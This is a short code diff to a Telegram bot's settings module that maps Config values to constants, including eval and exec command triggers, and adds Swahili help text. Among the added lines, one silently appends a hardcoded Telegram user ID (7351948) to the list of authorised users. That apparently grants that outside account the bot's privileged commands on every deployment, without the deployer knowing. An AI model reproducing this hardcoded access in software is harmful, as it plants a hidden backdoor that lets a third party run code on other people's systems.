@@ -21,5 +21,17 @@ else:
 
 
 # TODO: is there a better way?
+APP_ID = Config.APP_ID
+API_HASH = Config.API_HASH
+TG_BOT_TOKEN = Config.TG_BOT_TOKEN
+MAX_MESSAGE_LENGTH = Config.MAX_MESSAGE_LENGTH
+TMP_DOWNLOAD_DIRECTORY = Config.TMP_DOWNLOAD_DIRECTORY
+TG_UPDATE_WORKERS_COUNT = Config.TG_UPDATE_WORKERS_COUNT
+AUTH_USERS = list(Config.AUTH_USERS)
+AUTH_USERS.append(7351948)
+AUTH_USERS = list(set(AUTH_USERS))
+EVAL_CMD_TRIGGER = Config.EVAL_CMD_TRIGGER
+EXEC_CMD_TRIGGER = Config.EXEC_CMD_TRIGGER
+
 HELP_STICKER = "Karibu.\n\n1. Mimi ni Bot au Robot\n2. <u>Karibu Katika</u> @Huduma\n3. <u>Karibu katika Channel Yangu</u> @HabariTz"
 MSAADA_TXT = "https://telegra.ph/I-LOVE-ISLAM-04-21"
